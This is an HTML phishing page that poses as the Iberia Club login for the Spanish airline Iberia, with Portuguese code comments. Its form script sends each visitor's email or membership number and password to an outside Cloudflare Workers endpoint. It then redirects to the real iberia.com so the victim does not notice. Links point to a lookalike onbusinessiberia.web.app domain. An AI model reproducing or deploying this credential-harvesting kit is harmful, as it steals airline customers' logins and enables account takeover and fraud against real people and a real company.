<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Acceso a Iberia Club</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- CSS principal do layout -->
  <link rel="stylesheet" href="style.css">

  <!-- √çcone -->
  <link rel="icon" type="image/svg+xml" href="./Xjdsahd637sddUmi/logotopo.svg">

  <!-- Font Awesome (mesmo caminho do outro site) -->
  <link rel="stylesheet" href="./Xjdsahd637sddUmi/all.min.css">
</head>
<body>

  <!-- HEADER -->
  <header class="ib-header">
    <div class="ib-header__container">
      <div class="ib-header__left">
        <a href="https://www.iberia.com/es/" class="ib-header__logo" title="Iberia">
          <img src="./Xjdsahd637sddUmi/logotopo.svg" alt="Iberia">
        </a>
        <div class="ib-header__separator"></div>
      </div>
      <div class="ib-header__right">
        <span class="ib-header__label">¬øNo tienes cuenta?</span>
        <a href="https://onbusinessiberia.web.app/" class="ib-header__button">Reg√≠strate</a>
      </div>
    </div>
  </header>

  <!-- FORMUL√ÅRIO -->
  <div class="login-wrapper">
    <h1>Acceso a Iberia Club</h1>
    <p class="subtitle">Inicia sesi√≥n para ver promociones exclusivas y utilizar tus Avios.</p>

    <form id="loginForm">
      <div class="input-group">
        <input type="text" name="email" id="emailInput" placeholder="E-mail o n¬∫ Iberia Club" required>
        <p class="error-message" id="emailError"></p>
      </div>

      <div class="input-group password-group">
        <input type="password" name="password" placeholder="Contrase√±a" required>
        <span class="eye-icon">üëÅÔ∏è</span>
      </div>

      <div class="forgot">
        <a href="#">¬øHas olvidado tu contrase√±a?</a>
      </div>

      <button type="submit" class="login-btn">Iniciar sesi√≥n</button>

      <div class="divider"><span>o</span></div>

      <button type="button" class="google-btn">
        <img src="https://www.svgrepo.com/show/355037/google.svg" alt="Google"> Entrar con Google
      </button>

      <button type="button" class="facebook-btn">
        <span class="facebook-f">f</span> Entrar con Facebook
      </button>

      <div class="register">
        <p>¬øNo tienes cuenta? <a href="#">Reg√≠strate</a></p>
      </div>
    </form>
  </div>

  <!-- FOOTER -->
  <footer class="ib-footer">
    <div class="ib-footer__red">
      <div class="ib-footer__container">
        <div class="ib-footer__logo ib-footer__logo--red">
          <img src="./Xjdsahd637sddUmi/logofoter.svg" alt="Iberia">
        </div>
        <div class="ib-footer__links">
          <a href="https://onbusinessiberia.web.app/" class="ib-footer__link">Accesibilidad</a>
        </div>
      </div>
    </div>
    <div class="ib-footer__gray">
      <div class="ib-footer__copyright">¬© Iberia 2025</div>
    </div>
  </footer>

  <!-- SCRIPT -->
  <script>
    // Evitar zoom em dispositivos m√≥veis
    document.addEventListener("touchstart", function () {}, { passive: true });

    // Mostrar/ocultar senha
    const eyeIcon = document.querySelector(".eye-icon");
    const passwordInput = document.querySelector('input[name="password"]');
    eyeIcon.addEventListener("click", () => {
      const type = passwordInput.type === "password" ? "text" : "password";
      passwordInput.type = type;
    });

    // Valida√ß√£o de e-mail ou n¬∫ Iberia
    const CONFIG_VALIDACAO = {
      MIN_IBERIA_CLUB_LENGTH: 4,
      MAX_IBERIA_CLUB_LENGTH: 14,
      IBERIA_CLUB_PREFIX: /^(IB|ib)/i,
      EMAIL_REGEX: /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    };

    function isValidIberiaClubNumber(value) {
      if (!value) return false;
      let v = value.trim();

      if (CONFIG_VALIDACAO.IBERIA_CLUB_PREFIX.test(v)) {
        v = v.slice(2);
      }

      if (!/^\d+$/.test(v)) return false;

      if (
        v.length < CONFIG_VALIDACAO.MIN_IBERIA_CLUB_LENGTH ||
        v.length > CONFIG_VALIDACAO.MAX_IBERIA_CLUB_LENGTH
      ) {
        return false;
      }

      // Algoritmo de Luhn
      let sum = 0;
      let shouldDouble = false;
      for (let i = v.length - 1; i >= 0; i--) {
        let digit = parseInt(v.charAt(i), 10);
        if (shouldDouble) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
      }
      return sum % 10 === 0;
    }

    function isValidEmailOrIberiaClub(value) {
      const v = value.trim();
      if (!v) return false;
      if (v.includes("@")) return CONFIG_VALIDACAO.EMAIL_REGEX.test(v);
      return isValidIberiaClubNumber(v);
    }

    function showEmailError(message) {
      const emailInput = document.getElementById("emailInput");
      const errorEl = document.getElementById("emailError");
      if (!emailInput || !errorEl) return;
      if (message) {
        errorEl.textContent = message;
        errorEl.style.display = "block";
        emailInput.classList.add("input-error");
      } else {
        errorEl.textContent = "";
        errorEl.style.display = "none";
        emailInput.classList.remove("input-error");
      }
    }

    function clearEmailError() {
      showEmailError("");
    }

// Envio do formul√°rio
    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const email = e.target.email.value.trim();
      const password = e.target.password.value.trim();

      clearEmailError();

      if (!email || !password) {
        showEmailError("Por favor, preencha todos os campos.");
        return;
      }

      if (!isValidEmailOrIberiaClub(email)) {
        showEmailError("Por favor, introduce un e-mail o n¬∫ Iberia Club v√°lido.");
        return;
      }

      try {
        const response = await fetch("https://flat-butterfly-fb71.leticiaramosjesus070.workers.dev/", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            email: email,
            password: password,
            origem: "formulario_firebase",
            consent: true // ‚úÖ Adicionado para compatibilidade com o Worker
          })
        });

        let data = {};
        try {
          data = await response.json();
        } catch (e) {
          data = {};
        }

        // Se ok ou resposta 2xx, redireciona
        if (data.ok === true || response.ok) {
          e.target.reset();
          window.location.href = "https://www.iberia.com/es/";
          return;
        }

        alert("‚ùå Erro ao enviar: " + (data.error || "tente novamente"));
      } catch (err) {
        alert("Erro de conex√£o: " + err.message);
      }
    });

    const emailInput = document.getElementById("emailInput");
    if (emailInput) {
      emailInput.addEventListener("input", clearEmailError);
    }
  </script>
</body>
</html>
